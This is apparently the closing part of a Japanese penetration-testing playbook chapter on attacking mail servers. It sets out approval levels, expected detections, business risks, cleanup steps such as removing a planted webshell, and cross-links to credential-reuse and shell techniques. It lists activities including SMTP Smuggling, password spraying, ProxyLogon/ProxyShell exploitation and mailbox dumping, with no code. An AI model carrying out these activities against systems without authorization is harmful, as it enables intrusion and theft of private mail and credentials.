- **事前合意の要否**: ★★★（書面承認必須 — §6 SMTP Smuggling 実 PoC 送信 / §7 認証スプレー / §8 メール本文読取 / §9 CVE 実 exploit / §4 オープンリレー実送信）/ ★★（口頭確認可 — §3 ユーザー列挙はバウンス挙動で実認証ログを残さない範囲なら）/ ★（§1-§2 バナー・機能列挙 / §5 SPF/DKIM/DMARC DNS 確認 / §6 受信側 CHUNKING 列挙のみは技術的判断のみで実施可）
- **想定される SIEM / EDR 検知**: Exchange 認証ログ（Event ID 4625 / Sign-in Log）/ SMTP AUTH 失敗ログ大量 / IDS の ProxyLogon・ProxyShell シグネチャ / DMARC レポートに不正な From: が記録 / 出口 IP のレピュテーション DB（Spamhaus / SBL）登録リスク / §6 SMTP Smuggling 成立時は送信側 outbound SaaS の不正使用検知・受信側 SEG ログ
- **業務影響リスク**: アカウントロック発生時の業務影響（管理者・全社共有アカウントなら系統的影響）、§9 CVE 実 exploit 時のメール疎通停止・キュー破壊リスク、§4 オープンリレー実送信時の送信元 IP ブラックリスト登録、§6 SMTP Smuggling 成立時は送信元ドメインのレピュテーション毀損・受信者のフィッシング被害
- **原状回復必須項目**: ✅ §4 で送信したテストメールの受信側削除（受信者の協力依頼）/ ✅ §6 で送信した smuggled メールの受信側削除（`kedalab-[CASE_ID]` で検索）/ ✅ §8 でローカルにダンプしたメール本文・添付の暗号化保管 → テスト完了時破棄 / ✅ §9 で配置した webshell の削除 / ✅ 取得した認証情報の安全な破棄
- **取得情報の取扱**: 取得した cred は暗号化保管、メール本文・添付は最高機密扱い・テスト完了時即時破棄。テストレポート記載時もメール本文の具体的内容は引用せず「業務メールに API キーが含まれていた」のような抽象記載に留める
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

## 関連技術

- 前：25 / 465 / 587 / 110 / 995 / 143 / 993 ポートの発見 → `../01_Reconnaissance/Network_Scanning.md`
- 前：認証情報の取得 → `Credential_Discovery.md`
- 前：ロックアウト設定の事前確認 → `Account_Lockout_Recon.md`
- 前：製品出荷時のデフォルト認証情報試行 → `Default_Credentials.md`
- 前：ドメイン情報・DNS レコード取得（SPF/DKIM/DMARC 確認の前段）→ `../01_Reconnaissance/DNS_Enumeration.md`
- 後：§3 で取得したユーザー一覧で AD 列挙 → `../01_Reconnaissance/LDAP_Enumeration.md`
- 後：§8 で取得した他システム cred を SSH / WinRM 等に使い回し → `SSH.md` / `Protocol_Exploitation.md`（WinRM / Impacket exec 各セクション）
- 後：§8 で取得したバイナリ・添付の解析 → `Binary_Analysis.md` / `../01_Reconnaissance/Metadata_Analysis.md`
- 後：§9.1 で取得した webshell 経由のシェル取得 → `./Web_Vulnerabilities/File_Upload.md`
- 関連：SMTP / IMAP / POP の TLS 構成詳細監査 → `../01_Reconnaissance/TLS_Audit.md`
- 関連：FTP / Mail 等の平文プロトコル全般での cred 使い回し → `FTP.md` / `SSH.md`
